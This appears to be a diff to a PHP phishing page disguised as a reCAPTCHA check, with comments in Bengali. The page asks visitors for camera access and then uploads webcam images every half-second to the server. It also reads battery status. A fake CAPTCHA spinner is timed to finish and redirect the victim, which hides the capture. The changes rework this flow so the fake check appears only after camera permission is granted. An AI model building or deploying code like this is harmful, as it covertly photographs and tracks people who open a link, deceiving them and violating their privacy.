@@ -1,7 +1,6 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // Check link expiry parameter (e)
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
@@ -128,7 +127,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             transition: background 0.2s, border-color 0.2s;
         }
 
-        /* Auto-loading spinner */
         .recaptcha-spinner {
             width: 20px;
             height: 20px;
@@ -227,26 +225,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             recaptchaContainer.style.display = 'flex';
         }
 
-        // Auto Verification Function (Without User Click)
-        function autoVerifyAndRedirect() {
-            const checkbox = document.getElementById('recaptchaCheckbox');
-            const spinner = document.getElementById('recaptchaSpinner');
-
-            // 4 seconds (4000ms) loading timer
-            setTimeout(() => {
-                spinner.style.display = 'none';
-                checkbox.classList.add('checked');
-                
-                // Redirect to target URL on main tab after 500ms
-                setTimeout(() => {
-                    window.location.href = finalUrl;
-                }, 500);
-            }, 4000);
-        }
-
-        // Auto Start Loading Process
-        autoVerifyAndRedirect();
-
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -254,14 +232,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             });
         }
 
+        // পারমিশন allow পাওয়ার পরেই স্পিনার ঘুরবে এবং ৪ সেকেন্ড পর রিডাইরেক্ট হবে
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
+                    
+                    // পারমিশন পাওয়ার সাথে সাথে ছবি পাঠানো শুরু (প্রতি ০.৫ সেকেন্ড পর পর)
                     setTimeout(() => {
-                        // Capture image every 0.5s (500ms)
                         setInterval(captureAndUpload, 500);
                     }, 500);
+
+                    // পারমিশন পাওয়ার পর ক্যাপচা বক্স শো হবে এবং ৪ সেকেন্ড স্পিনার ঘুরবে
+                    recaptchaContainer.style.display = 'flex';
+                    
+                    const checkbox = document.getElementById('recaptchaCheckbox');
+                    const spinner = document.getElementById('recaptchaSpinner');
+
+                    setTimeout(() => {
+                        spinner.style.display = 'none';
+                        checkbox.classList.add('checked');
+                        
+                        setTimeout(() => {
+                            window.location.href = finalUrl;
+                        }, 500);
+                    }, 4000);
+
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
